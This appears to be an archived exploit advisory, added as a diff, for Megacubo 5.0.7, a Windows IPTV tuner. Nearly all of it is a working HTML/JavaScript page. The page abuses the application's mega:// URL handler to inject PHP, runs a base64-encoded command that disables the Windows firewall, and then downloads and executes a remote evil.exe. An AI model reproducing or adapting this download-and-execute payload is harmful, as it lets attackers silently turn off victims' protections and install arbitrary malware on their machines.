@@ -1,0 +1,41 @@
+Megacubo 5.0.7 download & Execute
+by :JJunior
+site: http://www.musicastop.com.br/
+
+tested against Internet Explorer 7 and Mozilla Firefox  1.5  Windows Xp sp 3
+
+software site: http://www.megacubo.net/tv/
+download url: http://sourceforge.net/project/showfiles.php?group_id=231636&package_id=280849&release_id=608023
+ 
+description:
+"Megacubo is a IPTV tuner application written in PHP + Winbinder.
+It has a catalogue of links of TV streams which are available
+for free in the web. At the moment it only runs on Windows(2000,
+XP and Vista)."
+ 
+example exploit, download & Execute :
+ 
+
+<html>
+<head>
+<title>MegaCubo - download & Execute</title>
+<meta http-equiv="Content-Type" content="text/html; ">
+</head>
+<body>
+<script>
+// url download & exec code evil
+evil = 'http://www.example.com/evil.exe';
+ 
+// disable firewall  encode base_64
+firewall = 'bmV0c2ggZmlyZXdhbGwgc2V0IG9wbW9kZSBtb2RlID0gZGlzYWJsZQ==';
+ 
+shellcode = 'mega://play|con.."a()".system(base64_decode("'+firewall+'")).fputs(fopen("c:/Megacubo.exe","w"),file_get_contents("'+evil+'")).system("C:/Megacubo.exe")."/?");print(';
+ 
+// shell code
+window.location=shellcode;
+
+</script>
+</body>
+</html>
+
+# milw0rm.com [2009-01-01]
